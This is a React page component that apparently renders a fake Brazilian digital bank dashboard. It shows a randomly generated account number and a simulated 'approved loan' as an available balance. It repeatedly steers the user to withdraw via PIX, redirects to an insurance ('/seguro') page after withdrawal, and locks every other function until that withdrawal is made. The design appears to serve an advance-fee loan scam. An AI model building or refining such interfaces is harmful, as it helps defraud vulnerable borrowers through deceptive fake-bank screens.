import { motion } from 'framer-motion'
import {
  ArrowDownLeft,
  ArrowDownToLine,
  ArrowRightLeft,
  ArrowUpRight,
  Barcode,
  Bell,
  ChevronRight,
  CreditCard,
  Eye,
  EyeOff,
  House,
  Percent,
  Receipt,
  Send,
  TrendingUp,
  User,
} from 'lucide-react'
import { useEffect, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { BoletoSheet } from '../components/BoletoSheet'
import { Logo } from '../components/Logo'
import { NotificationsSheet } from '../components/NotificationsSheet'
import { PixWithdrawSheet } from '../components/PixWithdrawSheet'
import { StatementSheet } from '../components/StatementSheet'
import { getBrandName } from '../lib/brand'
import { createAccountNumber, getNextDueDate } from '../lib/account'
import { formatBRL } from '../lib/loan'
import { useSimulation } from '../lib/simulation'

type SheetName =
  | 'withdraw'
  | 'transfer'
  | 'boleto'
  | 'statement'
  | 'notifications'
  | null

const QUICK_ACTIONS: Array<{
  icon: typeof ArrowUpRight
  label: string
  primary: boolean
  sheet: Exclude<SheetName, null>
}> = [
  { icon: ArrowUpRight, label: 'Sacar PIX', primary: true, sheet: 'withdraw' },
  { icon: Barcode, label: 'Pagar', primary: false, sheet: 'boleto' },
  {
    icon: ArrowRightLeft,
    label: 'Transferir',
    primary: false,
    sheet: 'transfer',
  },
  { icon: Receipt, label: 'Extrato', primary: false, sheet: 'statement' },
]

const SERVICES = [
  {
    title: 'Cartões',
    desc: 'Cartão sem anuidade, com limite pré-aprovado',
    icon: CreditCard,
  },
  {
    title: 'Empréstimos',
    desc: 'Gerencie ou solicite novos valores',
    icon: Percent,
  },
  {
    title: 'Investimentos',
    desc: 'Faça o saldo render 100% do CDI',
    icon: TrendingUp,
  },
]

export function DigitalPage() {
  const navigate = useNavigate()
  const { data, update } = useSimulation()

  const firstName = data.name.split(' ')[0] || 'cliente'
  const balance = data.approvedAmount > 0 ? data.approvedAmount : data.amount

  const [account] = useState(createAccountNumber)
  const [due] = useState(getNextDueDate)

  const [visible, setVisible] = useState(true)
  const [activeSheet, setActiveSheet] = useState<SheetName>(null)
  const [sheetSession, setSheetSession] = useState(0)
  const [lock, setLock] = useState(false)
  const lockTimer = useRef<number | null>(null)

  useEffect(() => {
    const html = document.documentElement
    const htmlBg = html.style.backgroundColor
    const bodyBg = document.body.style.backgroundColor
    html.style.backgroundColor = '#0b120d'
    document.body.style.backgroundColor = '#0b120d'
    return () => {
      html.style.backgroundColor = htmlBg
      document.body.style.backgroundColor = bodyBg
    }
  }, [])

  useEffect(
    () => () => {
      if (lockTimer.current) window.clearTimeout(lockTimer.current)
    },
    [],
  )

  const closeSheet = () => setActiveSheet(null)

  const openSheet = (sheet: Exclude<SheetName, null>) => {
    setSheetSession((current) => current + 1)
    setActiveSheet(sheet)
  }

  const showLock = () => {
    setLock(true)
    if (lockTimer.current) window.clearTimeout(lockTimer.current)
    lockTimer.current = window.setTimeout(() => setLock(false), 2800)
  }

  const handlePixComplete = (payload: {
    bank: string
    pixKeyType: string
    pixKey: string
  }) => {
    update(payload)
  }

  const handleWithdrawComplete = (payload: {
    bank: string
    pixKeyType: string
    pixKey: string
  }) => {
    update(payload)
    navigate('/seguro')
  }

  return (
    <div className="min-h-dvh bg-[#0b120d] text-white">
      <div className="max-w-md mx-auto px-5 pb-28">
        <header className="flex items-center justify-between pt-8 pb-6">
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 rounded-full bg-primary flex items-center justify-center text-[#0f1712] font-bold text-lg">
              {firstName.charAt(0).toUpperCase()}
            </div>
            <div>
              <p className="text-white/50 text-xs">Bem-vindo(a)</p>
              <p className="font-semibold leading-tight">{firstName}</p>
            </div>
          </div>
          <button
            type="button"
            aria-label="Notificações"
            onClick={() => openSheet('notifications')}
            className="relative w-10 h-10 rounded-full bg-white/5 flex items-center justify-center"
          >
            <Bell size={18} className="text-white/80" />
            <span className="absolute top-2 right-2.5 w-2 h-2 rounded-full bg-primary" />
          </button>
        </header>

        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          className="rounded-3xl bg-gradient-to-br from-[#1c2a20] to-[#0f1712] border border-white/10 p-6 shadow-xl relative overflow-hidden"
        >
          <div className="absolute -top-10 -right-10 w-40 h-40 bg-primary/15 blur-[70px]" />
          <div className="relative z-10">
            <div className="flex items-center justify-between mb-1">
              <div className="flex items-center gap-2 text-white/60 text-sm">
                <Logo variant="dark" className="text-base" /> · Conta
              </div>
              <button
                type="button"
                aria-label={visible ? 'Ocultar saldo' : 'Mostrar saldo'}
                onClick={() => setVisible((prev) => !prev)}
                className="text-white/60"
              >
                {visible ? <Eye size={18} /> : <EyeOff size={18} />}
              </button>
            </div>
            <p className="text-white/50 text-xs mb-1">
              Ag. 0001 · Conta {account}
            </p>
            <p className="text-white/60 text-sm mt-4 mb-1">Saldo disponível</p>
            <div className="text-4xl font-black tracking-tight">
              {visible ? formatBRL(balance) : 'R$ ••••••'}
            </div>
            <p className="text-primary text-xs mt-3 font-medium">
              Rendendo 100% do CDI
            </p>
          </div>
        </motion.div>

        <div className="grid grid-cols-4 gap-2 mt-5">
          {QUICK_ACTIONS.map((action) => {
            const Icon = action.icon
            return (
              <button
                key={action.label}
                type="button"
                onClick={() => openSheet(action.sheet)}
                className="flex flex-col items-center gap-2 py-4 rounded-2xl bg-white/5 transition-colors hover:bg-white/10"
              >
                <div
                  className={`w-11 h-11 rounded-full flex items-center justify-center ${
                    action.primary
                      ? 'bg-primary text-[#0f1712]'
                      : 'bg-white/10 text-primary'
                  }`}
                >
                  <Icon size={20} />
                </div>
                <span className="text-[11px] text-white/80 font-medium text-center leading-tight">
                  {action.label}
                </span>
              </button>
            )
          })}
        </div>

        <button
          type="button"
          onClick={() => openSheet('withdraw')}
          className="w-full mt-5 rounded-2xl bg-primary text-[#0f1712] p-4 flex items-center justify-between font-semibold hover:scale-[1.01] transition-transform shadow-[0_0_30px_rgba(180,240,69,0.2)]"
        >
          <span className="flex items-center gap-3">
            <Send size={20} /> Sacar meu dinheiro via PIX
          </span>
          <ChevronRight size={20} />
        </button>

        <div className="mt-8">
          <h2 className="text-sm font-semibold text-white/60 mb-3">
            Movimentações
          </h2>
          <div className="space-y-2">
            <button
              type="button"
              onClick={() => openSheet('statement')}
              className="w-full text-left flex items-center gap-3 bg-white/5 rounded-2xl px-4 py-3.5 transition-colors hover:bg-white/10"
            >
              <div className="w-10 h-10 rounded-full flex items-center justify-center shrink-0 bg-primary/20 text-primary">
                <ArrowDownLeft size={18} />
              </div>
              <div className="flex-1 min-w-0">
                <p className="font-medium text-sm truncate">
                  Empréstimo {getBrandName()}
                </p>
                <p className="text-white/50 text-xs">Valor liberado</p>
              </div>
              <div className="text-right">
                <p className="font-semibold text-sm text-primary">
                  +{formatBRL(balance)}
                </p>
                <p className="text-white/40 text-xs">Hoje</p>
              </div>
            </button>
          </div>
        </div>

        <section className="mt-5 rounded-3xl border border-white/10 bg-white/[0.04] p-5">
          <div className="flex items-start justify-between gap-3">
            <div>
              <h2 className="text-base font-semibold">Seu empréstimo</h2>
              <p className="text-white/45 text-xs mt-3">Valor disponível</p>
              <p className="text-2xl font-black tracking-tight mt-1">
                {visible ? formatBRL(balance) : 'R$ ••••••'}
              </p>
            </div>
            <button
              type="button"
              onClick={() => openSheet('withdraw')}
              className="shrink-0 mt-1 h-10 px-4 rounded-full bg-primary text-[#0f1712] text-sm font-bold inline-flex items-center gap-1"
            >
              Sacar
              <ChevronRight size={16} />
            </button>
          </div>
          <div className="mt-4 pt-4 border-t border-white/10 flex items-center justify-between gap-3 text-sm">
            <span className="text-white/45">Próximo vencimento</span>
            <span className="font-semibold text-right">
              {visible ? `${due} · parcela em dia` : '••/••/••••••'}
            </span>
          </div>
        </section>

        <section className="mt-6">
          <h2 className="text-sm font-semibold text-white/60 mb-3">
            Serviços da conta
          </h2>
          <div className="space-y-2">
            {SERVICES.map((service) => {
              const Icon = service.icon
              return (
                <button
                  key={service.title}
                  type="button"
                  onClick={showLock}
                  className="w-full text-left flex items-center gap-3 rounded-3xl bg-white/5 border border-white/10 px-4 py-4 transition-colors hover:bg-white/10"
                >
                  <div className="w-11 h-11 rounded-2xl bg-primary/15 text-primary flex items-center justify-center shrink-0">
                    <Icon size={20} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-semibold text-sm">{service.title}</p>
                    <p className="text-white/45 text-xs mt-0.5 leading-snug">
                      {service.desc}
                    </p>
                  </div>
                  <ChevronRight size={18} className="text-white/30 shrink-0" />
                </button>
              )
            })}
          </div>
        </section>

        <div
          className={`pointer-events-none fixed left-1/2 top-20 z-30 -translate-x-1/2 px-4 transition-all duration-300 ${
            lock ? 'opacity-100' : 'opacity-0'
          }`}
        >
          <div className="rounded-2xl bg-primary px-5 py-3 text-center text-sm font-semibold text-[#0f1712] shadow-lg">
            Para liberar esta função, faça o saque via PIX primeiro
          </div>
        </div>
      </div>

      <nav
        aria-label="Menu da conta"
        className="fixed bottom-0 inset-x-0 z-40 border-t border-white/10 bg-[#0b120d]/95 backdrop-blur-md"
      >
        <div className="max-w-md mx-auto grid grid-cols-3 px-3 pt-2 pb-[max(0.5rem,env(safe-area-inset-bottom))]">
          <button
            type="button"
            className="flex flex-col items-center gap-1 py-1 text-primary"
          >
            <House size={20} />
            <span className="text-[11px] font-semibold">Início</span>
          </button>
          <button
            type="button"
            onClick={() => openSheet('withdraw')}
            className="flex flex-col items-center gap-1 py-1 text-white/45"
          >
            <ArrowDownToLine size={20} />
            <span className="text-[11px]">Saque</span>
          </button>
          <button
            type="button"
            onClick={showLock}
            className="flex flex-col items-center gap-1 py-1 text-white/45"
          >
            <User size={20} />
            <span className="text-[11px]">Meus dados</span>
          </button>
        </div>
      </nav>

      <PixWithdrawSheet
        key={`withdraw-${sheetSession}`}
        open={activeSheet === 'withdraw'}
        mode="withdraw"
        amount={balance}
        initialBank={data.bank}
        initialPixKeyType={data.pixKeyType}
        initialPixKey={data.pixKey}
        onClose={closeSheet}
        onComplete={handleWithdrawComplete}
      />
      <PixWithdrawSheet
        key={`transfer-${sheetSession}`}
        open={activeSheet === 'transfer'}
        mode="transfer"
        amount={balance}
        initialBank={data.bank}
        initialPixKeyType={data.pixKeyType}
        initialPixKey={data.pixKey}
        onClose={closeSheet}
        onComplete={handlePixComplete}
      />
      <BoletoSheet
        key={`boleto-${sheetSession}`}
        open={activeSheet === 'boleto'}
        onClose={closeSheet}
      />
      <StatementSheet
        key={`statement-${sheetSession}`}
        open={activeSheet === 'statement'}
        amount={balance}
        onClose={closeSheet}
      />
      <NotificationsSheet
        open={activeSheet === 'notifications'}
        amount={balance}
        onClose={closeSheet}
      />
    </div>
  )
}
